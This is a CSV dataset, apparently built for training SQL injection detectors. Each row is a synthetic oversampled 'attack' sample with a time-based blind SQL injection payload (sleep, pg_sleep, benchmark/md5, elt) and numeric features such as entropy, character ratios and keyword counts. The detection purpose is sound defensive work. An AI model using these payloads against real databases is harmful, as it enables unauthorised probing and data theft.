id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001118,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,0.34467265259319396,68.52143327833929,24.086905546389882,3.6522212012063826,17.0,19.0,24.347622185559523,8.173811092779761,0.2482384010866916,0.2774429188615965,0.3551518104010145,0.11916686965069745,0.0869055463898809,0.9130944536101191,0.0,0.0,0.0,1.0,0.0,4.086905546389881,0.08690554638988099,0.0,1.0,1.0,0.08690554638988113,0.9130944536101191,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001119,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000017,0.17839682189248396,58.904013046614246,23.047993476692877,3.6254122744847854,20.904013046614246,10.0,22.0,6.0,0.35484760504648866,0.16977694604039772,0.373509281288875,0.10186616762423864,0.9520065233071224,0.04799347669287757,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,0.9520065233071224,0.047993476692877596,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.04799347669287757,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0479934766928776
SMOTE_001120,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000033,0.30442065776567856,77.76039374331037,26.90464567256234,3.4210258306833072,20.0,10.0,36.04645672562337,11.71393701768701,0.25791947164054324,0.12895973582027162,0.4627033971656621,0.15041739537352308,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.809291345124674,0.9046456725623369,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001121,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,0.0579416132661507,63.951206097584816,19.951206097584812,3.189206704320789,23.96747073172321,1.0,29.0,9.983735365861605,0.3747666958217853,0.015637498438118666,0.45348745470544066,0.15610835103465537,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.9837353658616045,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01626463413839563,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0162646341383956
SMOTE_001122,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000139,1.4964564516510244,68.6547308863653,23.663682721591325,3.4920016957794386,15.66592068039783,15.32736544318265,28.329603401989157,9.331841360795663,0.23038267385079095,0.21958058873274483,0.4139675501295989,0.13606918728686535,0.6659206803978313,0.0,2.0,0.0,0.0,1.6659206803978313,0.0,4.0,0.0,0.0,1.0,3.6659206803978313,0.6659206803978313,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6659206803978313,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6659206803978313
SMOTE_001123,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,0.17957272610446318,68.8986054407723,24.0,3.6377326831205195,17.0,19.0,24.740028010047777,8.158577430724524,0.24735704282125795,0.2764578713884648,0.35791615468939686,0.11826893110088048,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.158577430724524,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001124,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,2.101818468206612,83.73640325947648,25.51244227681455,3.6584988238026543,19.562211384072757,23.099538214516414,31.07465366088731,10.0,0.23322940816772508,0.27395730397328705,0.37182578896255736,0.12098749889643058,1.0,0.0,0.0,0.0,0.0,1.5124422768145516,0.0,5.0,0.48755772318544843,0.0,1.0,1.5124422768145516,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5124422768145515,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.512442276814552
SMOTE_001125,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000053,0.4866842349159744,88.80886481809932,28.0,3.8840179568368693,26.0,21.80886481809933,30.0,11.0,0.29276934559875095,0.24555591711091102,0.33781078338317416,0.12386395390716386,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.8088648180993279,0.1911351819006721,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001126,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000136,1.105844214075283,72.9000493889387,27.400014111125344,3.7535605815609436,16.0,21.0,26.80002822225069,9.100021166688016,0.21992141368176094,0.2886468554573113,0.3672158301526506,0.12421590070827727,0.0,0.7000070555626718,0.0,0.0,0.0,1.0,0.0,4.700007055562672,0.7000070555626718,0.0,1.0,1.0,0.0,0.7000070555626718,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001127,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000025,0.0734865715561415,56.31082388715824,17.937835222568353,3.098903026057328,22.0,1.0,25.248659109726592,8.062164777431647,0.3908553496728685,0.017766152257857645,0.4482301852944184,0.14314831277485549,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.062164777431648,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001128,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000131,0.8015619724649722,74.93136301069705,16.18050805819429,2.6811981867018058,19.54152417458287,1.81949194180571,41.29237912708564,12.277967767222837,0.264721098868058,0.02397176238744246,0.5480928119886526,0.1632143267558469,3.819491941805709,0.0,0.0,0.0,0.0,1.0,0.0,7.4584758254171275,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.18050805819429083,0.0,0.0,0.0,1.8194919418057092,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001129,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,0.11296262188382744,62.66802033427234,18.917005083568085,3.1802896799758504,25.875507625352128,1.0414974582159573,27.751015250704256,8.0,0.4129259600883415,0.016723324540644416,0.44260011296817964,0.12775060240283442,0.0,3.0414974582159573,0.0,0.0,0.0,0.0,0.0,4.958502541784043,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9585025417840426,0.0,0.0,0.0,1.0414974582159573,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001130,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000031,0.7835506903833563,62.252134633382795,27.065168291728497,3.879026940154601,22.626067316691397,10.0,21.186966341654298,8.439100975037098,0.3633691537217524,0.16074217209205596,0.34072748243830564,0.1351611917478859,2.6260673166913984,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.813033658345699,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8130336583456991,0.0,1.0,0.0,0.8130336583456991,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.626067316691398
SMOTE_001131,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.03764433113781064,75.8011445081009,22.0,3.163715251923239,19.0,10.0,36.829552435515055,9.971592072585842,0.2507204909126779,0.13195815311193573,0.4857749119564094,0.13154644401897692,0.0,0.0,2.0,0.0,0.0,1.0,0.0,5.9715920725858425,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001132,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.628878793020071,82.41182341468873,22.970441463278192,3.1210793777328116,29.382264877966914,2.0,39.823646829377445,11.205911707344361,0.3567060130012522,0.02427066683661766,0.4830833227113952,0.13593999745073487,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.205911707344361,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.20591170734436173,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.205911707344362
SMOTE_001133,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000037,1.955989786461518,61.69957383676544,22.82510654080864,3.470404535183221,19.0,10.0,25.52468037757408,7.17489345919136,0.3092329546832542,0.16275418667539693,0.41228506264855136,0.11572779599279753,0.0,1.0,1.1748934591913593,0.0,0.0,1.0,0.0,3.58744672959568,0.0,0.0,0.0,2.1748934591913596,0.0,1.0,0.5874467295956797,0.4125532704043203,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001134,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,1.0877280226687152,70.0,19.760481231587605,2.8192335106237474,10.239518768412397,10.0,38.0,11.760481231587605,0.1462788395487485,0.14285714285714285,0.5428571428571428,0.16800687473696577,0.23951876841239583,0.7604812315876041,0.0,0.0,0.0,1.0,0.0,7.0,0.760481231587604,0.0,1.0,1.0,0.23951876841239594,0.7604812315876041,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2395187684123959,0.7604812315876041,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001135,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000070,0.2753818863444576,65.28982366495049,22.0,3.4030342757288063,19.0,10.0,28.031858931960393,8.257964732990098,0.291325486948809,0.1533292036572679,0.4289433271494117,0.1264019822445114,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.257964732990098,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001136,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000153,0.4726836734845475,62.12527916719509,16.375837501585277,2.894141795144901,22.50111666878037,1.0,29.749441665609815,8.874720832804908,0.3620873250860448,0.01609695873855732,0.4789316457378279,0.14288407043757,0.0,3.0,0.0,0.0,0.0,0.8747208328049078,0.0,5.0,0.0,0.0,0.0,0.8747208328049079,0.0,1.0,0.0,0.0,0.0,0.8747208328049078,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001137,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.7273465668496052,74.32116197871119,22.959336012165032,3.280433629867552,19.959336012165032,10.0,34.841493972628676,9.520331993917484,0.26998616692010485,0.13478039287049734,0.4674047575719804,0.1278286826374174,0.0,0.0,2.0,0.0,0.0,1.0,0.0,5.520331993917484,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001138,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000007,0.7694853451305367,93.57314987272652,22.857716624242173,3.171521544779656,30.573149872726518,1.8577166242421725,45.284566751515655,15.857716624242173,0.3266434933343197,0.019812843457249374,0.4840960404921415,0.16944762271628944,3.430866496968692,0.42685012727348104,0.0,0.0,1.0,1.0,0.0,8.142283375757827,1.857716624242173,0.0,0.0,2.0,0.857716624242173,0.14228337575782704,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.857716624242173,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.8577166242421725
SMOTE_001139,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.9338642877357249,71.63396270064018,23.732074598719638,3.5152003571326853,16.267925401280362,19.732074598719638,28.0,7.633962700640181,0.2270174614595663,0.2755602660007141,0.3908937880246625,0.10652848451505703,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6339627006401811,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001140,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,1.0001326644227146,74.48061716712202,22.607753133151192,3.244713421037601,19.0,10.0,35.17674060054643,10.303876566575596,0.2553499395523872,0.13439470502757223,0.4715806987505585,0.138674656669482,0.30387656657559514,0.0,2.0,0.0,0.0,1.0,0.0,5.696123433424405,0.30387656657559514,1.0,0.0,3.0,0.30387656657559514,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001141,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.20364291132464293,65.66836192686188,22.93923982483074,3.4731024253205365,19.0,10.0,27.607601751692613,9.06076017516926,0.28973706951206973,0.1524931944800367,0.4197263849867914,0.13804335102110227,0.0,0.9392398248307389,2.0,0.0,0.0,1.0,0.0,4.121520350338522,0.0,1.0,0.0,3.0,0.0,0.939239824830739,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001142,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,0.19688953599383205,58.77488391371983,20.889302298040025,3.3195918928991968,14.963100766013342,10.295193871893268,25.47969004182656,8.03689923398666,0.2556168890709246,0.1744592766112203,0.43287863914948593,0.13704519516836916,0.0,0.0,1.926201532026683,0.0,0.0,1.0368992339866585,0.0,4.073798467973317,0.0,0.0,1.0,2.9631007660133415,0.0,0.0,0.9631007660133415,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0368992339866585,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0368992339866585
SMOTE_001143,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000073,1.8490870061877447,62.47337674731128,24.473376747311278,3.7796555769544433,22.23668837365564,10.0,21.0,9.236688373655639,0.35591239685630083,0.16009733682633245,0.33620440733529816,0.14778585898206859,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.2366883736556398,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.23668837365563966,1.0,0.0,1.0,0.0,0.23668837365563966,0.7633116263443604,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001144,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.010483493222530641,99.0,28.0,3.7366607384253534,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001145,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000134,1.2386965342742502,69.54222400122806,22.30722199984649,3.403210238798524,15.921665999539478,15.542224001228064,29.385556000307016,8.692778000153508,0.23073493748880672,0.22119793751439137,0.42306712499680194,0.125,0.307221999846492,0.0,2.0,0.0,0.0,1.692778000153508,0.0,4.0,0.0,0.0,0.692778000153508,3.692778000153508,0.307221999846492,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001146,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000094,1.5107981254545861,78.9773615297263,24.27924615135037,3.5469151806476584,28.9924538432421,7.418869227025555,31.852830767566914,10.713207691891729,0.3676581561128793,0.08838791709557156,0.40684516264011394,0.13710876415143525,3.7132076918917285,0.0,0.0,0.0,0.0,1.7132076918917283,0.0,4.2867923081082715,0.0,1.0,0.0,1.7132076918917285,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7132076918917283,1.7132076918917283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.426415383783457
SMOTE_001147,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000069,0.030586344058984482,56.98515495194387,17.992577475971938,3.075971674816019,22.007422524028062,1.0074225240280636,25.97030990388775,8.0,0.3862040430388626,0.01768354989398907,0.4557236477738631,0.14038875929328515,0.0,3.0074225240280628,0.0,0.0,0.0,0.9925774759719371,0.0,4.0,0.0,0.0,0.0,0.9925774759719371,0.0,1.0,0.0,0.0,0.0,0.992577475971937,1.0,0.0,0.0,0.0,0.0,0.992577475971937,0.0,0.0,0.0,1.0074225240280628,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001148,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.6836553401787929,82.48702992430698,19.252161679282167,2.916966087680213,27.0,2.0,41.99135328287132,11.495676641435661,0.3276633382240097,0.02427135838696369,0.5089028371514027,0.13916246623762388,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.74783832071783,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7478383207178307,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001149,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.219316578404503,69.85999173988172,27.859991739881714,3.858188253548782,16.0,21.0,24.0,8.859991739881716,0.22904204457182614,0.30061768350052187,0.34356306685773924,0.12677720506991272,0.9299958699408576,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.9299958699408575,0.0,1.0,1.0,0.9299958699408576,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
